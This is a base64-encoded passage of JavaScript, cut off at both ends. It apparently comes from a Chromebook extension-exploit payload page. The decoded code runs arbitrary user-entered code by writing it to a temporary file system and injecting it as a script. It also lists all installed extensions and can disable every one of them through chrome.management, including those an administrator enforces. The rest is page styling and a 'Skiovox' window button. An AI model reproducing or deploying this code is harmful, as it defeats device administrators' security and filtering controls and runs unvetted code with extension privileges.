gICAgICAgICAgICAgICAgICAgICAgICB9OwoKICAgICAgICAgICAgICAgICAgICAgICAgZGl2LmFwcGVuZENoaWxkKHByZXZpZXdCdXR0b24pOwogICAgICAgICAgICAgICAgICAgICAgICB0YWJsaXN0LmFwcGVuZENoaWxkKGRpdik7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgdGhpei50YWJMaXN0SW5Qcm9ncmVzcyA9IGZhbHNlOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pOwogICAgfQogICAgYWN0aXZhdGUoKSB7CiAgICAgICAgZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoCiAgICAgICAgICAgICJiZWZvcmVlbmQiLAogICAgICAgICAgICBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLnRlbXBsYXRlCiAgICAgICAgKTsKCiAgICAgICAgZG9jdW1lbnQuYm9keQogICAgICAgICAgICAucXVlcnlTZWxlY3RvcigiI2V4dF9kZWZhdWx0IikKICAgICAgICAgICAgLnF1ZXJ5U2VsZWN0b3JBbGwoImJ1dHRvbiIpCiAgICAgICAgICAgIC5mb3JFYWNoKGZ1bmN0aW9uKGJ0bikgewoKICAgICAgICAgICAgICAgIGJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIHRoaXMub25CdG5DbGlja18uYmluZCh0aGlzLCBidG4pKTsKICAgICAgICAgICAgfSwgdGhpcyk7CgogICAgICAgIHRoaXMudXBkYXRlVGFiTGlzdCgpOwogICAgICAgIGZvciAobGV0IGkgaW4gY2hyb21lLnRhYnMpIHsKICAgICAgICAgICAgaWYgKGkuc3RhcnRzV2l0aCgib24iKSkgewogICAgICAgICAgICAgICAgY2hyb21lLnRhYnNbaV0uYWRkTGlzdGVuZXIoKCkgPT4gewogICAgICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlVGFiTGlzdCgpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgfQogICAgc3RhdGljIGdldEZTKCkgewogICAgICAgIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihyZXNvbHZlKSB7CiAgICAgICAgICAgIHdlYmtpdFJlcXVlc3RGaWxlU3lzdGVtKFRFTVBPUkFSWSwgMiAqIDEwMjQgKiAxMDI0LCByZXNvbHZlKTsKICAgICAgICB9KTsKICAgIH0KICAgIHN0YXRpYyBhc3luYyB3cml0ZUZpbGUoZmlsZSwgZGF0YSkgewogICAgICAgIGNvbnN0IGZzID0gYXdhaXQgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy5nZXRGUygpOwogICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7CiAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICBjcmVhdGU6IHRydWUKICAgICAgICAgICAgfSwgZnVuY3Rpb24oZW50cnkpIHsKICAgICAgICAgICAgICAgIGVudHJ5LnJlbW92ZShmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGU6IHRydWUKICAgICAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgICBlbnRyeS5jcmVhdGVXcml0ZXIoZnVuY3Rpb24od3JpdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9IHJlc29sdmUuYmluZChudWxsLCBlbnRyeS50b1VSTCgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICB9CiAgICBzdGF0aWMgYXN5bmMgZXZhbENvZGUoY29kZSkgewogICAgICAgIGNvbnN0IHVybCA9IGF3YWl0IERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMud3JpdGVGaWxlKCJzcmMuanMiLCBjb2RlKTsKICAgICAgICBsZXQgc2NyaXB0ID0KICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKCIjZXZhbHVhdGVfZWxlbSIpID8/CiAgICAgICAgICAgIGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgICAgIHNjcmlwdC5yZW1vdmUoKTsKICAgICAgICBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICBzY3JpcHQuaWQgPSAiZXZhbHVhdGVfZWxlbSI7CiAgICAgICAgc2NyaXB0LnNyYyA9IHVybDsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNjcmlwdCk7CiAgICB9CgogICAgYXN5bmMgb25CdG5DbGlja18oYikgewogICAgICAgIHN3aXRjaCAoYi5pZCkgewogICAgICAgICAgICBjYXNlICJjb2RlX2V2YWx1YXRlIjogewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coIkV2YWx1YXRpbmcgY29kZSEiKTsKICAgICAgICAgICAgICAgIGNvbnN0IHggPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjY29kZV9pbnB1dCIpLnZhbHVlOwogICAgICAgICAgICAgICAgY29uc3QgZnMgPSBhd2FpdCBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmdldEZTKCk7CiAgICAgICAgICAgICAgICBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmV2YWxDb2RlKHgpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhc2UgInRhYnJlbG9hZCI6IHsKICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlVGFiTGlzdCgpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CmNsYXNzIEhvc3RQZXJtaXNzaW9ucyB7CiAgICBhY3RpdmF0ZSgpIHt9Cn0KCmZ1bmN0aW9uIGNyZWF0ZUV4dGVuc2lvbkNhcmQobmFtZSwgaWQsIGVuYWJsZWQsIGljb25fdXJsKSB7CiAgY29uc3QgbGkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaSIpOwogIGxpLmNsYXNzTmFtZSA9ICJleHRlbnNpb24tY2FyZCI7CgogIGNvbnN0IGhlYWRlckRpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogIGhlYWRlckRpdi5jbGFzc05hbWUgPSAiZXh0ZW5zaW9uLWhlYWRlciI7CgogIGNvbnN0IGljb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICBpY29uLmNsYXNzTmFtZSA9ICJleHRlbnNpb24taWNvbiI7CiAgaWNvbi5zcmMgPSBpY29uX3VybDsKICBpY29uLmFsdCA9ICJFeHRlbnNpb24gSWNvbiI7CgogIGNvbnN0IG5hbWVEaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICBuYW1lRGl2LmNsYXNzTmFtZSA9ICJleHRlbnNpb24tbmFtZSI7CiAgbmFtZURpdi50ZXh0Q29udGVudCA9IG5hbWU7CgogIGhlYWRlckRpdi5hcHBlbmRDaGlsZChpY29uKTsKICBoZWFkZXJEaXYuYXBwZW5kQ2hpbGQobmFtZURpdik7CgogIGNvbnN0IGlkRGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgaWREaXYuY2xhc3NOYW1lID0gImV4dGVuc2lvbi1pZCI7CiAgaWREaXYudGV4dENvbnRlbnQgPSBpZDsKCiAgY29uc3Qgc3dpdGNoTGFiZWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsYWJlbCIpOwogIHN3aXRjaExhYmVsLmNsYXNzTmFtZSA9ICJzd2l0Y2giOwoKICBjb25zdCBjaGVja2JveCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CiAgY2hlY2tib3gudHlwZSA9ICJjaGVja2JveCI7CiAgaWYgKGVuYWJsZWQpIGNoZWNrYm94LmNoZWNrZWQgPSB0cnVlOwoKICBjb25zdCBzbGlkZXJTcGFuID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwogIHNsaWRlclNwYW4uY2xhc3NOYW1lID0gInNsaWRlciI7CgogIHN3aXRjaExhYmVsLmFwcGVuZENoaWxkKGNoZWNrYm94KTsKICBzd2l0Y2hMYWJlbC5hcHBlbmRDaGlsZChzbGlkZXJTcGFuKTsKCiAgbGkuYXBwZW5kQ2hpbGQoaGVhZGVyRGl2KTsKICBsaS5hcHBlbmRDaGlsZChpZERpdik7CiAgbGkuYXBwZW5kQ2hpbGQoc3dpdGNoTGFiZWwpOwoKICByZXR1cm4gbGk7Cn0KCmZ1bmN0aW9uIGNyZWF0ZUV4dGVuc2lvbkNhcmRBbGwoZW5hYmxlZCA9IHRydWUpIHsKICBjb25zdCBsaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxpIik7CiAgbGkuY2xhc3NOYW1lID0gImV4dGVuc2lvbi1jYXJkLWFsbCI7CiAgbGkuaW5uZXJIVE1MID0gYAogICAgPGRpdiBjbGFzcz0iZXh0ZW5zaW9uLWhlYWRlciI+CiAgICAgIDxpbWcgY2xhc3M9ImV4dGVuc2lvbi1pY29uIiBzcmM9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UM00xTjRML1QzTTFONEwvcmVmcy9oZWFkcy9tYWluL2ltYWdlcy9YT3NYLmdpZiIgLz4KICAgICAgPGRpdiBjbGFzcz0iZXh0ZW5zaW9uLW5hbWUiPkFsbCBFeHRlbnNpb25zPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxsYWJlbCBjbGFzcz0ic3dpdGNoIj4KICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiAke2VuYWJsZWQgPyAiY2hlY2tlZCIgOiAiIn0+CiAgICAgIDxzcGFuIGNsYXNzPSJzbGlkZXIiPjwvc3Bhbj4KICAgIDwvbGFiZWw+CiAgYDsKICByZXR1cm4gbGk7Cn0KCmZ1bmN0aW9uIHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRsaXN0X2VsZW1lbnQpIHsKICAgIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihyZXNvbHZlLCByZWplY3QpIHsKICAgICAgICBleHRsaXN0X2VsZW1lbnQuaW5uZXJIVE1MID0gIiI7CiAgICAgICAgbGV0IGNhcmRBbGwgPSBjcmVhdGVFeHRlbnNpb25DYXJkQWxsKCk7CiAgICAgICAgbGV0IGNhcmRJbnB1dEFsbCA9IGNhcmRBbGwucXVlcnlTZWxlY3RvcigiaW5wdXQiKTsKCiAgICAgICAgY2FyZElucHV0QWxsLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIChldmVudCkgPT4gewogICAgICAgICAgICBjYXJkSW5wdXRBbGwuZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRTZWxmKGZ1bmN0aW9uKHNlbGYpIHsKICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldEFsbChmdW5jdGlvbihleHRlbnNpb25zKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcikgewogICAgICAgICAgICAgICAgICAgICAgICBhbGVydCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFcnJvciBsb2FkaW5nIGV4dGVuc2lvbnM6ICIgKyBjaHJvbWUucnVudGltZS5sYXN0RXJyb3IubWVzc2FnZQogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVqZWN0KGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcik7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBjb25zdCBwcm9taXNlcyA9IFtdOwogICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZXh0ZW5zaW9ucy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICBsZXQgZXh0SWQgPSBleHRlbnNpb25zW2ldLmlkOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZXh0SWQgIT09IHNlbGYuaWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb21pc2VzLnB1c2goCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChleHRJZCwgZXZlbnQudGFyZ2V0LmNoZWNrZWQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIFByb21pc2UuYWxsKHByb21pc2VzKQogICAgICAgICAgICAgICAgICAgICAgICAudGhlbigoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXJkSW5wdXRBbGwuZGlzYWJsZWQgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc29sdmUoKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgLmNhdGNoKChlcnJvcikgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgYWxlcnQoIkVycm9yIGVuYWJsaW5nL2Rpc2FibGluZyBleHRlbnNpb25zOiAiICsgZXJyb3IubWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWplY3QoZXJyb3IpOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9KTsKICAgICAgICB9KTsKCiAgICAgICAgZXh0bGlzdF9lbGVtZW50LmFwcGVuZENoaWxkKGNhcmRBbGwpOwoKICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoZnVuY3Rpb24oZXh0bGlzdCkgewogICAgICAgICAgICBpZiAoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKSB7CiAgICAgICAgICAgICAgICBhbGVydCgiRXJyb3IgbG9hZGluZyBleHRlbnNpb25zOiAiICsgY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yLm1lc3NhZ2UpOwogICAgICAgICAgICAgICAgcmV0dXJuIHJlamVjdChjaHJvbWUucnVudGltZS5sYXN0RXJyb3IpOwogICAgICAgICAgICB9CgogICAgICAgICAgICBjb25zdCBvcmRsaXN0ID0gW107CiAgICAgICAgICAgIGV4dGxpc3QuZm9yRWFjaChmdW5jdGlvbihleHRlbnNpb24pIHsKICAgICAgICAgICAgICAgIGlmIChleHRlbnNpb24uaWQgPT09IG5ldyBVUkwobmV3IFVSTChsb2NhdGlvbi5ocmVmKS5vcmlnaW4pLmhvc3QpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBvcmRsaXN0LnB1c2goZXh0ZW5zaW9uKTsKCiAgICAgICAgICAgICAgICBjb25zdCBpY29uID0KICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uaWNvbnM/LmZpbmQoKGljKSA9PiBpYy5zaXplID09PSAxMjgpID8/CiAgICAgICAgICAgICAgICAgICAgZXh0ZW5zaW9uLmljb25zPy5hdCgtMSk7CgogICAgICAgICAgICAgICAgbGV0IGNhcmQgPSBjcmVhdGVFeHRlbnNpb25DYXJkKAogICAgICAgICAgICAgICAgICAgIGV4dGVuc2lvbi5uYW1lLAogICAgICAgICAgICAgICAgICAgIGV4dGVuc2lvbi5pZCwKICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uZW5hYmxlZCwKICAgICAgICAgICAgICAgICAgICBpY29uPy51cmwgfHwKICAgICAgICAgICAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvVDNNMU40TC9yZWZzL2hlYWRzL21haW4vaW1hZ2VzL1hPc1guZ2lmIgogICAgICAgICAgICAgICAgKTsKCiAgICAgICAgICAgICAgICBsZXQgY2FyZElucHV0ID0gY2FyZC5xdWVyeVNlbGVjdG9yKCJpbnB1dCIpOwoKICAgICAgICAgICAgICAgIGNhcmRJbnB1dC5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCAoZXZlbnQpID0+IHsKICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKAogICAgICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uaWQsCiAgICAgICAgICAgICAgICAgICAgICAgIGV2ZW50LnRhcmdldC5jaGVja2VkLAogICAgICAgICAgICAgICAgICAgICAgICAocmVzdWx0KSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWxlcnQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFcnJvciB1cGRhdGluZyBleHRlbnNpb24gc3RhdHVzOiAiICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yLm1lc3NhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgIGNhcmQucXVlcnlTZWxlY3RvcigiLmV4dGVuc2lvbi1pY29uIikuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgdXNlcmRlZklkcyA9IEpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSk7CiAgICAgICAgICAgICAgICAgICAgaWYgKHVzZXJkZWZJZHMuaW5jbHVkZXMoZXh0ZW5zaW9uLmlkKSkgewogICAgICAgICAgICAgICAgICAgICAgICB1c2VyZGVmSWRzLnJlbW92ZShleHRlbnNpb24uaWQpOwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgidXNlcmRlZklkcyIsIEpTT04uc3RyaW5naWZ5KHVzZXJkZWZJZHMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgbWFrZVRvYXN0KCJyZW1vdmVkICIgKyBleHRlbnNpb24uc2hvcnROYW1lICsgIiBmcm9tIHRoZSBsaXN0IiwgMik7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgdXNlcmRlZklkcy5wdXNoKGV4dGVuc2lvbi5pZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJ1c2VyZGVmSWRzIiwgSlNPTi5zdHJpbmdpZnkodXNlcmRlZklkcykpOwogICAgICAgICAgICAgICAgICAgICAgICBtYWtlVG9hc3QoImFkZGVkICIgKyBleHRlbnNpb24uc2hvcnROYW1lICsgIiB0byB0aGUgbGlzdCIsIDIpOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikgPT09IEpTT04uc3RyaW5naWZ5KFtdKSkgewogICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLnF1ZXJ5U2VsZWN0b3IoIiNkaXNhYmxlLXVzZXJkZWYtZXh0cyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAuc2V0QXR0cmlidXRlKCJzdHlsZSIsICJkaXNwbGF5OiBub25lOyIpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAucXVlcnlTZWxlY3RvcigiI2Rpc2FibGUtdXNlcmRlZi1leHRzIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC5zZXRBdHRyaWJ1dGUoInN0eWxlIiwgImRpc3BsYXk6IGlubGluZTsiKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICBleHRsaXN0X2VsZW1lbnQuYXBwZW5kQ2hpbGQoY2FyZCk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICBzYXZlZEV4dExpc3QgPSBvcmRsaXN0OwogICAgICAgICAgICByZXNvbHZlKCk7CiAgICAgICAgfSk7CiAgICB9KTsKfQoKY29uc3QgZmlsZU1hbmFnZXJQcml2YXRlVGVtcGxhdGUgPSBgCiAgPGRpdiBpZD0iZmlsZU1hbmFnZXJQcml2YXRlX2NhcCI+CiAgICA8ZGl2IGlkPSJGTVBfb3BlblVSTCI+CiAgICAgIDxidXR0b24gaWQ9ImJ0bl9GTVBfb3BlblVSTCI+T3BlbiBVUkwgaW4gU2tpb3ZveCB3aW5kb3c8L2J1dHRvbj4KICAgIDwvZGl2PgogIDwvZGl2PgoKYDsKY29uc3QgaHRtbFN0eWxlID0gYAo8c3R5bGU+CkBpbXBvcnQgdXJsKCdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PVJvYm90bzp3Z2h0QDQwMCZkaXNwbGF5PXN3YXAnKTsKCiogewogIGZvbnQtZmFtaWx5OiAnUm9ib3RvJywgQXJpYWwsIHNhbnMtc2VyaWY7Cn0KCmJvZHkgewogIGJhY2tncm91bmQtY29sb3I6ICMxZTFmMjI7CiAgY29sb3I6ICNmZmY7CiAgbWFyZ2luOiAwOwogIHBhZGRpbmc6IDIwcHg7Cn0KCmJvZHk6Oi13ZWJraXQtc2Nyb2xsYmFyLApkaWFsb2c6Oi13ZWJraXQtc2Nyb2xsYmFyLApkaWFsb2cgZGl2Ojotd2Via2l0LXNjcm9sbGJhciB7CiAgZGlzcGxheTogbm9uZTsKfQoKcCB7CiAgbWFyZ2luOiA1cHggYXV0bzsKICBjb2xvcjogd2hpdGU7Cn0KCiNjaHJvbWVfbWFuYWdlbWVudF9kaXNhYmxlX2V4dCwgI2V4dF9kZWZhdWx0IHsKICBtYXgtd2lkdGg6IDEyMDBweDsKICBtYXJnaW46IDAgYXV0bzsKfQoKaDEgewogIGZvbnQtc2l6ZTogMjRweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgouZGVzY3JpcHRpb24gewogIG1hcmdpbi1ib3R0b206IDIwcHg7Cn0KCnVsIHsKICBsaXN0LXN0eWxlLXR5cGU6IG5vbmU7CiAgcGFkZGluZzogMDsKICBtYXJnaW46IDA7CiAgcGFkZGluZy1ib3R0b206IDUwcHg7CiAgZGlzcGxheTogZmxleDsKICBmbGV4LXdyYXA6IHdyYXA7CiAgZ2FwOiAxMHB4OwogIGp1c3RpZnktY29udGVudDogY2VudGVyOwp9CgouZXh0ZW5zaW9uLWNhcmQsIC5leHRlbnNpb24tY2FyZC1hbGwgewogIG1hcmdpbi1sZWZ0OiA1cHg7CiAgbWFyZ2luLWJvdHRvbTogNnB4OwogIGJhY2tncm91bmQ6ICMyOTJhMmQ7CiAgYm9yZGVyLXJhZGl1czogMTBweDsKICB3aWR0aDogMzc1cHg7CiAgaGVpZ2h0OiAxNDBweDsKICBwYWRkaW5nOiAxMHB4OwogIGRpc3BsYXk6IGZsZXg7CiAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsKICBnYXA6IDEwcHg7CiAgcGFkZGluZzogMTBweDsKICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgYm94LXNoYWRvdzogMCA0cHggOHB4IHJnYmEoMCwgMCwgMCwgMC4yKTsKfQoKLmV4dGVuc2lvbi1oZWFkZXIgewogIGRpc3BsYXk6IGZsZXg7CiAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICBtYXJnaW4tYm90dG9tOiAyNXB4OwogIG1hcmdpbi10b3A6IDEwcHg7Cn0KCi5leHRlbnNpb24taWNvbiB7CiAgd2lkdGg6IDMycHg7CiAgaGVpZ2h0OiAzMnB4OwogIGZsZXgtc2hyaW5rOiAwOwogIHVzZXItc2VsZWN0OiBub25lOwogIG1hcmdpbi1sZWZ0OiAxMHB4OwogIG1hcmdpbi1yaWdodDogMTBweDsKfQoKLmV4dGVuc2lvbi1uYW1lIHsKICBmb250LXNpemU6IDEzcHg7CiAgY29sb3I6IHdoaXRlOwp9CgouZXh0ZW5zaW9uLWlkIHsKICBmb250LXNpemU6IDEzcHg7CiAgY29sb3I6ICNjNGM3YzU7CiAgbWFyZ2luLWxlZnQ6IDEwcHg7Cn0KCi5zd2l0Y2ggewogICAgcG9zaXRpb246IGFic29sdXRlOwogICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgd2lkdGg6IDI4cHg7CiAgICBoZWlnaHQ6IDE2cHg7CiAgICByaWdodDogMjBweDsKICAgIGJvdHRvbTogMTVweDsKfQoKLnN3aXRjaCBpbnB1dCB7CiAgb3BhY2l0eTogMDsKICB3aWR0aDogMDsKICBoZWlnaHQ6IDA7Cn0KCi5zbGlkZXIgewogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBjdXJzb3I6IHBvaW50ZXI7CiAgdG9wOiAwOwogIGxlZnQ6IDA7CiAgcmlnaHQ6IDA7CiAgYm90dG9tOiAwOwogIGJhY2tncm91bmQtY29sb3I6ICM0NDQ3NDY7CiAgYm9yZGVyLXJhZGl1czogMTVweDsKICBib3JkZXI6IDEuNXB4IHNvbGlkICM4ZTkxOGY7CiAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjFzIGVhc2UtaW4tb3V0LCBib3JkZXItY29sb3IgMC4xcyBlYXNlLWluLW91dDsKfQoKLnNsaWRlcjpiZWZvcmUgewogIGNvbnRlbnQ6ICIiOwogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBoZWlnaHQ6IDEycHg7CiAgd2lkdGg6IDEycHg7CiAgbGVmdDogMnB4OwogIHRvcDogNTAlOwogIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKSBzY2FsZSgwLjgpOwogIGJhY2tncm91bmQtY29sb3I6ICM4ZTkxOGY7CiAgYm9yZGVyLXJhZGl1czogNTAlOwogIHRyYW5zaXRpb246IHRyYW5zZm9ybSAwLjFzIGVhc2UtaW4tb3V0LCBiYWNrZ3JvdW5kLWNvbG9yIDAuMXMgZWFzZS1pbi1vdXQ7Cn0KCi5zd2l0Y2g6aG92ZXIgLnNsaWRlcjpiZWZvcmUgewogIGJveC1zaGFkb3c6IDAgMCA2cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpOwp9CgppbnB1dDpjaGVja2VkICsgLnNsaWRlciB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2E4YzdmYTsKICBib3JkZXItY29sb3I6ICNhOGM3ZmE7Cn0KCmlucHV0OmNoZWNrZWQgKyAuc2xpZGVyOmJlZm9yZSB7CiAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoMTBweCwgLTUwJSkgc2NhbGUoMSk7CiAgYmFja2dyb3VuZC1jb2xvcjogIzA2MmU2ZjsKfQoKLmhlYWRlciB7CiAgZGlzcGxheTogZmxleDsKICBhbGlnbi1pdGVtczogY2VudGVyOwogIGp1c3RpZnktY29udGVudDogY2VudGVyOwp9CgoubG9nbyB7CiAgd2lkdGg6IDRlbTsKICBoZWlnaHQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiAxMHB4Owp9CgoudGFibGlzdC1pdGVtIHsKICBib3JkZXI6IDFweCBzb2xpZCAjMzMzOwogIG1hcmdpbi1ib3R0b206IDEwcHg7CiAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsKICBwYWRkaW5nOiAxNXB4OwogIGJvcmRlci1yYWRpdXM6IDhweDsKICBkaXNwbGF5OiBmbGV4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7Cn0KCi50YWJsaXN0LWl0ZW0gaW1nIHsKICBtYXgtd2lkdGg6IDI1cHg7CiAgbWFyZ2luLXJpZ2h0OiAxMHB4Owp9CgoudGFibGlzdC1pdGVtIHNwYW4gewogIHBhZGRpbmc6IDEwcHggMDsKICB0ZXh0LW92ZXJmbG93OiBlbGxpcHNpczsKICB3aWR0aDogMTAwJTsKICB3aGl0ZS1zcGFjZTogbm93cmFwOwogIG92ZXJmbG93OiBoaWRkZW47CiAgd29yZC1icmVhazogYnJlYWstYWxsOwp9CgoudGFibGlzdC1pdGVtIHNwYW46aG92ZXIgewogIG92ZXJmbG93OiB2aXNpYmxlOwogIHdoaXRlLXNwYWNlOiBub3JtYWw7CiAgaGVpZ2h0OiBhdXRvOwp9CgpidXR0b24gewogICAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7CiAgICBjb2xvcjogI